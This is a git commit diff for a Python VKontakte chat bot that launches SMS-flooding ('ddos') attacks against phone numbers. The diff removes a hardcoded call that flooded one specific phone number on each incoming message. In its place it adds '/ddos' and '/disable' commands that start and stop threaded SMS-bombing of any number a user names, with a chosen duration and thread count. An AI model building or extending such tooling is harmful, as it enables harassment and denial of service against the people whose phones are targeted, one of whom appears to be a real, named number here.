bc85463ed5c65e3dc31b6c4348220ff19d052fd9
Timur Likhomanov <lihomanov.t@gmail.com>
2020-08-09 22:32:52 +0700

    working

--- bot.py
+++ bot.py
@@ -6,7 +6,7 @@ from processing.request_process import ReqProcess
 from sql.initializing import init_database_connection
 from tools.connect import LONGPOLL
 from tools.functionality import call_ddos_number, stop_ddos_number
-from threading import Thread
+
 
 class Bot:
     def __init__(self, longpoll: VkBotLongPoll, process: ReqProcess):
@@ -20,11 +20,14 @@ class Bot:
     def start(self):
         for event in self.longpoll.listen():
             if event.type == VkBotEventType.MESSAGE_NEW:
-                Thread(target=call_ddos_number, args=('1', '+79631961603', 100, 100)).start()
-                #self.process.process(event.message.from_id, event.message.text)
-                print(f"New message from {event.message.from_id}")
-
-
+                if event.message.text.split()[0] == '/ddos':
+                    args = event.message.text.split()
+                    call_ddos_number(event.message.from_id, args[1], int(args[2]), int(args[3]))
+                    #self.process.process(event.message.from_id, event.message.text)
+                    print(f"New message from {event.message.from_id}")
+                elif event.message.text.split()[0] == '/disable':
+                    args = event.message.text.split()
+                    stop_ddos_number(event.message.from_id, args[1])
 
 
 
--- tools/functionality.py
+++ tools/functionality.py
@@ -1,23 +1,33 @@
-
+from threading import Thread
 
 from processing.start_ddos import AttackMethod
+from settings.response_info import info
 from sql.ddosnumberlist_table import add_number
+from tools.api import messages_send
 
 ddos_dict = dict()
 ddos_threads_dict = dict()
 
 def call_ddos_number(user_id: str, number: str, time: int, threads: int):
+    # Parse the number
     pr_number = parse_number(number)
-    add_number(user_id, pr_number)
-    ddos_dict.update({f'{user_id}': {
-        f'{pr_number}': AttackMethod(name='SMS', duration=time, threads=threads, target=pr_number)
-        }
-    })
-    ddos_dict.get(user_id)[pr_number].Start()
+    # Add to history of ddos
+    add_number(user_id, number)
+    # Init key user_id with key pr_number and value is AttackMethod
+    ddos_dict[user_id] = {
+        pr_number: AttackMethod(name='SMS', duration=time, threads=threads, target=pr_number)}
+    ddos_threads_dict[user_id] = { pr_number: Thread(target=ddos_dict[user_id][pr_number].Start)}
+    ddos_threads_dict[user_id][pr_number].start()
+    messages_send(user_id, info['str_ddos'].format(number, time, threads))
 
 
 def stop_ddos_number(user_id: str, number: str):
-    print(ddos_dict.get(42141))
+    if user_id in ddos_dict:
+        pr_number = parse_number(number)
+        # Switch off ddos for user_id and number
+        ddos_dict[user_id][pr_number].is_running = False
+        del ddos_dict[user_id][pr_number]
+        messages_send(user_id, info['dis_ddos'].format(number))
 
 
 def process_bl(user_id, command: str, number: str):
@@ -32,7 +42,7 @@ def send_info(user_id, command: str):
 
 def parse_number(number: str) -> str:
     if number.startswith('+7'):
-        return number[2:]
+        return number[1:]
     if number.startswith('8') and len(number) >= 11:
         return number[1:]
     else:
